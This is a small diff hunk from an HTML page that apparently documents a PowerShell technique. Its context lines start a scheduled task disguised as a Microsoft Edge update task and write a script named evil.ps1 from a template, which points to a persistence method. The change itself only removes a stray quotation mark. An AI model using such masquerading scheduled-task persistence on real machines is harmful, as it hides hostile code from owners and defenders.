@@ -134,7 +134,7 @@ Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS"
 
 '
 New-Item -Path . -Name evil.ps1 -Value $template -Force
-"
+
 </code></pre>
 <h2 id="operating-systems-tested">💻 Operating Systems Tested</h2>
 <ul>
